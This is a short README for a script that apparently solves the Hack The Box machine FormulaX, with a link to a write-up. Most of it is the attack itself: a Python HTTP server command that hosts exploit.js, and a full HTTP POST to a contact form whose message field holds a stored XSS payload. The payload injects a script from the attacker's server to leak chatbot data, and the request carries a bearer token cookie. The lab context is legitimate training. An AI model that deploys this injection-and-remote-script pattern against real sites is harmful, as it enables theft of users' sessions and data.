# HTB FormulaX

WriteUp: [https://gunzf0x.github.io/pentesting/posts/formulax/](https://gunzf0x.github.io/pentesting/posts/formulax/)

Script for [HTB FormulaX](https://www.hackthebox.com/machines/formulax) machine to leak data from chatbot.

## Usage
Start an `HTTP` listener server with `Python` exposing `exploit.js`:
```shell-session
❯ python3 -m http.server 8000
```
and, in `BurpSuite`, send the request with `XSS` payload:
```http
POST /user/api/contact_us HTTP/1.1
Host: 10.10.11.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 168
Origin: http://10.10.11.6
DNT: 1
Connection: close
Referer: http://10.10.11.6/restricted/contact_us.html
Cookie: authorization=Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NjRkNTVmZjY2Nzg2M2QwYTNmYjk0OTgiLCJpYXQiOjE3MTYzNDQzMzh9.Luv5ZIi-x48Bwf1cTRpJD2KQSwqGOeO-g0jwxtfj-Rk

{
"first_name":"John",
"last_name":"Wick",
"message":"<img src=x onerror=\"with(top)body.appendChild (createElement('script')).src='http://10.10.16.2:8000/exploit.js'\">"
}
```
We should get a message with leaked data.
